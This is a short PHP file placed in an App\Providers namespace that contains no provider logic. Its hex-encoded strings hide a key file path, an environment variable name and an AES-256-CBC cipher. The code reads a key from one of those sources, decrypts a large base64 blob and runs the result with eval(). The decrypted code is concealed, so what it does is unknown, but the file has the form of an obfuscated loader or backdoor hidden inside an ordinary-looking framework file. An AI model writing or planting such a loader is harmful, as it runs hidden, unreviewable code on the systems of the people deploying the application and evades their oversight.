<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('T/uGrpTU1oMN8ErDjCOSRg==');

$c=base64_decode(

'jUW2gLR4SNDZTf/OT1Dzzy1DyPzz2GJQ3KD4pvsdapHA6vI3n2QhS5Xy04haUdUx9nVHoCWyTyAT' .
'mUAl+D2lGYjt0daIIEl7tqaWa4h2/93ZRRtgkwhhvhQT+ZK9hyzF4z0DZZeDCQFI8ymYDGdCrkLj' .
'M7CVh7K5NMB9J8n4C026hgooYLMUhhnU7lRrXt8Homx8oj8AmzHWDrHiTZcLq28OPAt88GYq6DO6' .
'dwnvCYkGYbDElnk7LhdO7DbauaBGUk3NP/R9fnY4snzTpxwOiGLSgZASthsF5T6So1NJjRVxmSaW' .
'62+TomVoHNqcfR0akJV8grZgoqh26dTooDZ4LN2VdM0X/87sxldCXrTivtsEo8JGEdHw9XnIIJpc' .
'R9Xkaxl0EQiY++T/vTsyQKMlc28P7XeP3fMSfLTKJeQZNkN8eIHstU6vYos2uBe+AdYifb42xPmw' .
'etyb4cR2T6X4d+A1nbQUJcQl/K0pcUV9RYqhg67Bepibu2Zt9ec+j2VVCBpa2sHvSzuuBqrdiyFN' .
'yFP9CnfqH4iQUBmZrTWLOf0e01kJVUMl3yvoZGighaAK0HoAlYjngrxTGkqLWCuWGiO4d+vmwDkX' .
'O+TDW6IeIZObNYMomSx90iBeIAo+Ka0gezSWz3oywdZdVu8H3LkHvr8WrEXen5eL9UKJzttrIImz' .
'ms2URRJXmVVZ2wHn+Lf0yODVdFWu9IKVkdM7WXN5q8HLkEopiimX+QjhbjT6U3RJRTtO39j0Rywj' .
'CieCMEajdTqwzt7dKIDwkR4K/X2yKTk4FKnWFyT1eqfHN7FY6zm3wh5rpSMCfsmBb9bPI9o1HQ5y' .
'VvR6Vp3nJWThsqHtgMd4QlYGCnogsGSgJArXbYHL20HWxaAPQxJQV6yy8jNwgw2qU1+Mwngl4OPV' .
'bKm2ceHt5KGHVAB3osX6qYWB1EXzOa3SEkVt3m9JTubEwAOAtKBb4k9sNuO10VItJFLjT5WVLXXu' .
'MvccDPXhft9u6+rRijTD7/HRYM/ClHg/PV1gZA2+wKfQYWGiF/J9QjV+atIQs0ynBw5gWmQzgJr0' .
'6WJWiQfdWkoJXOES3D6s2SLeNkU9jdoGKjGLPvbO1584wPhNuAFUJdgMwYcRYGXQcmPPjA875BEU' .
'knfGIS57yzjEA99oJ6M2Ng3/L2dJrZ6wPrOo4D2G3ym3IH9tf+ci1iclaeq7KiRb9LC6dlSg9Msg' .
'XiqyxwFhOl/P9DnwM3KIV2bIbo+IBPrUDsKz0AqNSj4pRmOiRYR8/ytEtfi7sScm17WKH78Q5P8/' .
'A3YBRZbLpcPwuijIqckV47PxLNVWIy3jU4fis+HzvGJCtFqD/VRywKLwADFbehTxVbYd9xNhxvK8' .
'B77ruGb9qmScP1+kv1Qo5r4fCDhOLUNEM0uAfEWYbQK3pT+vp0UA94RC4X45H2fyj4AYUq7ZZepR' .
'KqqMc4tsx/EnCOxDDakSZas6GvIlSqIgP9zpyivaTg807KeajP45uQ1rsoJxgoPgYIxmN9NJgG/j' .
'ub/1rLxFBjMvvdhNOXiDvFAsekUUqEXnw39P9Wqqf+YBziv84QU/a6XcIp/A4ZJVAqwhb8AoVthB' .
'H2/i93sTYUhWYagdVGy4iYVXmGBDv8KaCdP6B38unE6w99cxC6NH30OC6ioFX/wXevnHH974eDjO' .
'0bpaDOGX39SPt8u3LCo0dZUIdD7d2DVVrShNJav/zSbVR9ewFkGGc6AIUBVw7Y9Fvxir3tt4uQWP' .
'pcs8ND9fb19j+rqGsWklYUcsDjkyAjaSmOB4XUWz926zoy6a1ay/Ryx3rBGaeYf0YC//l87KhyfL' .
'uuAPG67p3zDEOG8NnyUsE/T/Bq5x/ApH'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

